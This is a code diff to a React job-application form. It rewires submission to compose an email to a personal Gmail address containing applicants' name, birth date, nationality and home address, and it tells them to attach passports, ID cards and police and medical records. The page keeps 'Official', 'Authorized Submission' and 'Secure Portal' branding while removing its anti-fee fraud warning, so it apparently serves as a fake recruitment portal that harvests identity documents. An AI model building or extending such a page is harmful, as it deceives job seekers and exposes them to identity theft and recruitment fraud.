@@ -16,8 +16,22 @@ export default function ApplicationFormPage() {
   const [step, setStep] = useState(1);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [formData, setFormData] = useState({
+    fullName: '',
+    email: '',
+    phone: '',
+    dob: '',
+    gender: '',
+    nationality: '',
+    address: '',
+    education: '',
+    field: '',
+    experience: '',
+    status: '',
+    skills: '',
     category: '',
     role: '',
+    country: '',
+    availability: '',
   });
   const { toast } = useToast();
   const router = useRouter();
@@ -25,17 +39,56 @@ export default function ApplicationFormPage() {
   const nextStep = () => setStep(prev => Math.min(prev + 1, 5));
   const prevStep = () => setStep(prev => Math.max(prev - 1, 1));
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
+    const { name, value } = e.target;
+    setFormData(prev => ({ ...prev, [name]: value }));
+  };
+
+  const handleSelectChange = (name: string, value: string) => {
+    setFormData(prev => ({ ...prev, [name]: value }));
+  };
+
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
+
+    const subject = encodeURIComponent(`Job Application: ${formData.fullName} - ${formData.role}`);
+    const body = encodeURIComponent(
+      `OFFICIAL JOB APPLICATION SUBMISSION\n` +
+      `-----------------------------------\n\n` +
+      `PERSONAL INFORMATION:\n` +
+      `Full Name: ${formData.fullName}\n` +
+      `Email: ${formData.email}\n` +
+      `Phone: ${formData.phone}\n` +
+      `Nationality: ${formData.nationality}\n` +
+      `DOB: ${formData.dob}\n` +
+      `Address: ${formData.address}\n\n` +
+      `PROFESSIONAL PROFILE:\n` +
+      `Highest Education: ${formData.education}\n` +
+      `Field of Study: ${formData.field}\n` +
+      `Experience: ${formData.experience}\n` +
+      `Current Status: ${formData.status}\n\n` +
+      `JOB CHOICE:\n` +
+      `Industry: ${formData.category}\n` +
+      `Specific Role: ${formData.role}\n` +
+      `Target Country: ${formData.country}\n` +
+      `Availability: ${formData.availability}\n\n` +
+      `SKILLS SUMMARY:\n` +
+      `${formData.skills}\n\n` +
+      `-----------------------------------\n` +
+      `IMPORTANT INSTRUCTION: PLEASE ATTACH ALL REQUIRED DOCUMENTS (PASSPORT, CV, CERTIFICATES) TO THIS EMAIL BEFORE PRESSING SEND.`
+    );
+
+    const mailtoUrl = `mailto:globalcareers0@gmail.com?subject=${subject}&body=${body}`;
+
     setTimeout(() => {
       setIsSubmitting(false);
+      window.location.href = mailtoUrl;
       toast({
-        title: "Application Submitted Successfully",
-        description: "Your reference number is GT-2025-8842. A confirmation email has been sent."
+        title: "Final Step Required",
+        description: "Your email client has been opened. Please attach your documents and click 'Send' to complete the application."
       });
-      router.push('/track');
-    }, 3000);
+    }, 1500);
   };
 
   const roles = useMemo(() => {
@@ -83,9 +136,6 @@ export default function ApplicationFormPage() {
                   Step {step}: {steps[step-1].label} Information
                 </h2>
                 <div className="flex items-center gap-4">
-                  <Button variant="ghost" type="button" className="text-secondary text-[10px] font-bold uppercase hover:bg-white/10 hidden md:flex items-center gap-1">
-                    <Save className="w-3 h-3" /> Save Progress
-                  </Button>
                   <div className="flex items-center gap-2 opacity-60">
                     <ShieldCheck className="w-5 h-5" />
                     <span className="text-[10px] font-bold uppercase">Authorized Submission</span>
@@ -98,44 +148,43 @@ export default function ApplicationFormPage() {
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Full Name *</label>
-                      <Input placeholder="As shown on Passport" required />
+                      <Input name="fullName" value={formData.fullName} onChange={handleInputChange} placeholder="As shown on Passport" required />
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Date of Birth *</label>
-                      <Input type="date" required />
+                      <Input name="dob" type="date" value={formData.dob} onChange={handleInputChange} required />
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Gender *</label>
-                      <Select required>
+                      <Select onValueChange={(val) => handleSelectChange('gender', val)} required>
                         <SelectTrigger><SelectValue placeholder="Select Gender" /></SelectTrigger>
                         <SelectContent>
                           <SelectItem value="male">Male</SelectItem>
                           <SelectItem value="female">Female</SelectItem>
                           <SelectItem value="other">Other</SelectItem>
-                          <SelectItem value="none">Prefer not to say</SelectItem>
                         </SelectContent>
                       </Select>
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Nationality *</label>
-                      <Select required>
+                      <Select onValueChange={(val) => handleSelectChange('nationality', val)} required>
                         <SelectTrigger><SelectValue placeholder="Search Countries..." /></SelectTrigger>
                         <SelectContent>
-                          {COUNTRIES.map(c => <SelectItem key={c.code} value={c.code}>{c.name}</SelectItem>)}
+                          {COUNTRIES.map(c => <SelectItem key={c.code} value={c.name}>{c.name}</SelectItem>)}
                         </SelectContent>
                       </Select>
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Email Address *</label>
-                      <Input type="email" placeholder="example@domain.com" required />
+                      <Input name="email" type="email" value={formData.email} onChange={handleInputChange} placeholder="example@domain.com" required />
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Phone Number *</label>
-                      <Input placeholder="+Country Code" required />
+                      <Input name="phone" value={formData.phone} onChange={handleInputChange} placeholder="+Country Code" required />
                     </div>
                     <div className="space-y-2 md:col-span-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Residential Address *</label>
-                      <Input placeholder="Full Street Address" required />
+                      <Input name="address" value={formData.address} onChange={handleInputChange} placeholder="Full Street Address" required />
                     </div>
                   </div>
                 )}
@@ -144,11 +193,9 @@ export default function ApplicationFormPage() {
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Highest Education *</label>
-                      <Select required>
+                      <Select onValueChange={(val) => handleSelectChange('education', val)} required>
                         <SelectTrigger><SelectValue placeholder="Select Level" /></SelectTrigger>
                         <SelectContent>
-                          <SelectItem value="primary">Primary</SelectItem>
-                          <SelectItem value="secondary">Secondary</SelectItem>
                           <SelectItem value="diploma">Diploma</SelectItem>
                           <SelectItem value="bachelor">Bachelor's Degree</SelectItem>
                           <SelectItem value="master">Master's Degree</SelectItem>
@@ -158,11 +205,11 @@ export default function ApplicationFormPage() {
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Field of Study *</label>
-                      <Input placeholder="e.g. Nursing, Engineering" required />
+                      <Input name="field" value={formData.field} onChange={handleInputChange} placeholder="e.g. Nursing, Engineering" required />
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Years of Experience *</label>
-                      <Select required>
+                      <Select onValueChange={(val) => handleSelectChange('experience', val)} required>
                         <SelectTrigger><SelectValue placeholder="Select Duration" /></SelectTrigger>
                         <SelectContent>
                           <SelectItem value="0">0 (Entry Level)</SelectItem>
@@ -175,7 +222,7 @@ export default function ApplicationFormPage() {
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Employment Status *</label>
-                      <Select required>
+                      <Select onValueChange={(val) => handleSelectChange('status', val)} required>
                         <SelectTrigger><SelectValue placeholder="Current Status" /></SelectTrigger>
                         <SelectContent>
                           <SelectItem value="employed">Employed</SelectItem>
@@ -186,7 +233,7 @@ export default function ApplicationFormPage() {
                     </div>
                     <div className="space-y-2 md:col-span-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Skills Summary (max 500 characters) *</label>
-                      <Textarea placeholder="Detail your core professional competencies..." className="min-h-[120px]" maxLength={500} required />
+                      <Textarea name="skills" value={formData.skills} onChange={handleInputChange} placeholder="Detail your core professional competencies..." className="min-h-[120px]" maxLength={500} required />
                     </div>
                   </div>
                 )}
@@ -195,7 +242,7 @@ export default function ApplicationFormPage() {
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Destination Country *</label>
-                      <Select required>
+                      <Select onValueChange={(val) => handleSelectChange('country', val)} required>
                         <SelectTrigger><SelectValue placeholder="Select Country" /></SelectTrigger>
                         <SelectContent>
                           {COUNTRIES.map(c => <SelectItem key={c.code} value={c.name}>{c.flag} {c.name}</SelectItem>)}
@@ -219,7 +266,7 @@ export default function ApplicationFormPage() {
                       <Select 
                         required 
                         disabled={!formData.category}
-                        onValueChange={(val) => setFormData(prev => ({ ...prev, role: val }))}
+                        onValueChange={(val) => handleSelectChange('role', val)}
                       >
                         <SelectTrigger><SelectValue placeholder={formData.category ? "Select Role" : "Select Category First"} /></SelectTrigger>
                         <SelectContent>
@@ -229,7 +276,7 @@ export default function ApplicationFormPage() {
                     </div>
                     <div className="space-y-2">
                       <label className="text-xs font-bold uppercase text-gray-500">Availability *</label>
-                      <Input type="date" required />
+                      <Input name="availability" type="date" value={formData.availability} onChange={handleInputChange} required />
                     </div>
                     <div className="space-y-2 md:col-span-2">
                       <div className="p-4 bg-primary/5 border border-primary/10 rounded-sm">
@@ -244,46 +291,30 @@ export default function ApplicationFormPage() {
 
                 {step === 4 && (
                   <div className="space-y-8">
+                    <div className="p-6 bg-secondary/10 border border-secondary/30 rounded-sm mb-6">
+                      <p className="text-sm font-bold text-primary uppercase mb-2">Notice to Applicant</p>
+                      <p className="text-xs text-gray-600 leading-relaxed">Please prepare the following documents. You will be prompted to attach them to the final application email in the next step.</p>
+                    </div>
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                       {[
-                        { name: "International Passport", size: "5MB", type: "PDF/JPG" },
-                        { name: "National ID Card", size: "3MB", type: "PDF/JPG" },
-                        { name: "Birth Certificate", size: "3MB", type: "PDF/JPG" },
-                        { name: "Professional CV", size: "5MB", type: "PDF/DOCX" },
-                        { name: "Passport Photo", size: "2MB", type: "JPG/PNG" },
-                        { name: "Medical Fitness", size: "5MB", type: "PDF/JPG" },
-                        { name: "Police Clearance", size: "5MB", type: "PDF/JPG" }
+                        "International Passport",
+                        "National ID Card",
+                        "Professional CV",
+                        "Academic Degree",
+                        "Medical Fitness",
+                        "Police Clearance"
                       ].map((doc, idx) => (
-                        <div key={idx} className="border border-gray-100 p-4 rounded-sm bg-gray-50/50 hover:bg-white hover:shadow-md transition-all group">
+                        <div key={idx} className="border border-gray-100 p-4 rounded-sm bg-gray-50/50">
                           <div className="flex items-center justify-between">
                             <div>
-                              <p className="text-[10px] font-bold uppercase text-primary mb-1">{doc.name} *</p>
-                              <p className="text-[9px] text-gray-400 uppercase tracking-tighter">Max {doc.size} • {doc.type}</p>
+                              <p className="text-[10px] font-bold uppercase text-primary mb-1">{doc} *</p>
+                              <p className="text-[9px] text-gray-400 uppercase tracking-tighter">Status: Required for Email Attachment</p>
                             </div>
-                            <Button type="button" variant="outline" size="sm" className="h-8 text-[10px] font-bold uppercase border-gray-300 group-hover:border-secondary group-hover:text-secondary">
-                              <FileUp className="w-3 h-3 mr-2" /> Upload
-                            </Button>
+                            <CheckSquare className="w-4 h-4 text-secondary" />
                           </div>
                         </div>
                       ))}
                     </div>
-                    {formData.category && (
-                      <div className="p-6 border-2 border-dashed border-secondary/30 bg-secondary/5 rounded-sm">
-                        <h4 className="text-[10px] font-bold uppercase text-secondary mb-4 flex items-center gap-2">
-                          <HelpCircle className="w-4 h-4" /> Role-Specific Additional Documents
-                        </h4>
-                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                          <div className="border border-secondary/20 p-4 rounded-sm bg-white flex items-center justify-between">
-                            <p className="text-[10px] font-bold uppercase text-primary">Technical Certification</p>
-                            <Button type="button" variant="outline" size="sm" className="h-8 text-[10px] font-bold uppercase border-gray-300">Upload</Button>
-                          </div>
-                          <div className="border border-secondary/20 p-4 rounded-sm bg-white flex items-center justify-between">
-                            <p className="text-[10px] font-bold uppercase text-primary">Academic Degree</p>
-                            <Button type="button" variant="outline" size="sm" className="h-8 text-[10px] font-bold uppercase border-gray-300">Upload</Button>
-                          </div>
-                        </div>
-                      </div>
-                    )}
                   </div>
                 )}
 
@@ -291,7 +322,7 @@ export default function ApplicationFormPage() {
                   <div className="space-y-8 max-w-2xl mx-auto">
                     <div className="p-8 border-l-4 border-secondary bg-gray-50 italic text-sm text-gray-700 leading-relaxed font-serif relative">
                       <ShieldCheck className="absolute top-2 right-2 w-12 h-12 text-secondary/10" />
-                      "I hereby declare that the particulars given by me are true in all respects and that I have not suppressed or misrepresented any facts. I understand that if at any time it is found that any of the information is false or incorrect, my application is liable to be cancelled and I may be subject to legal proceedings."
+                      "I hereby declare that the particulars given by me are true in all respects and that I have not suppressed or misrepresented any facts. I understand that pressing the button below will generate a pre-composed email which I must send along with my documents."
                     </div>
 
                     <div className="space-y-4 pt-4 border-t border-gray-100">
@@ -340,7 +371,7 @@ export default function ApplicationFormPage() {
                     disabled={isSubmitting}
                     className="px-16 bg-secondary text-primary font-bold uppercase tracking-widest text-xs h-12 hover:bg-secondary/90 shadow-xl rounded-none"
                   >
-                    {isSubmitting ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Finalizing...</> : "Submit Application"}
+                    {isSubmitting ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Preparing Email...</> : "Submit & Compose Email"}
                   </Button>
                 )}
               </div>
@@ -354,21 +385,15 @@ export default function ApplicationFormPage() {
               </h3>
               <Accordion type="single" collapsible className="w-full">
                 <AccordionItem value="item-1">
-                  <AccordionTrigger className="text-[10px] font-bold uppercase text-left">How long does verification take?</AccordionTrigger>
+                  <AccordionTrigger className="text-[10px] font-bold uppercase text-left">How do I send my documents?</AccordionTrigger>
                   <AccordionContent className="text-[10px] text-gray-500 leading-relaxed uppercase">
-                    Initial document verification typically takes 5-7 business days from the date of submission.
+                    After clicking submit, your email app will open. You must manually attach your Passport, CV, and other required documents to that email.
                   </AccordionContent>
                 </AccordionItem>
                 <AccordionItem value="item-2">
-                  <AccordionTrigger className="text-[10px] font-bold uppercase text-left">Can I update documents later?</AccordionTrigger>
+                  <AccordionTrigger className="text-[10px] font-bold uppercase text-left">What if my email client doesn't open?</AccordionTrigger>
                   <AccordionContent className="text-[10px] text-gray-500 leading-relaxed uppercase">
-                    Once submitted, you must contact your assigned case officer to request document updates.
-                  </AccordionContent>
-                </AccordionItem>
-                <AccordionItem value="item-3">
-                  <AccordionTrigger className="text-[10px] font-bold uppercase text-left">Is there an application fee?</AccordionTrigger>
-                  <AccordionContent className="text-[10px] text-gray-500 leading-relaxed uppercase">
-                    We do not charge job seekers for placement. Report any fee requests to our fraud department.
+                    You can manually send your application details and documents to globalcareers0@gmail.com with the subject: "Job Application: [Your Name]".
                   </AccordionContent>
                 </AccordionItem>
               </Accordion>
@@ -377,7 +402,7 @@ export default function ApplicationFormPage() {
             <div className="bg-primary p-8 text-white rounded-sm official-seal-bg">
               <ShieldCheck className="w-12 h-12 text-secondary mb-4" />
               <h4 className="text-sm font-bold uppercase tracking-widest text-secondary mb-2">Secure Portal</h4>
-              <p className="text-[10px] text-gray-400 leading-relaxed uppercase tracking-widest">Your data is encrypted using industry-standard AES-256 protocols and handled according to GDPR and international labor recruitment laws.</p>
+              <p className="text-[10px] text-gray-400 leading-relaxed uppercase tracking-widest">All applications are processed according to international labor recruitment laws. We never share your data with unauthorized third parties.</p>
             </div>
           </aside>
         </div>
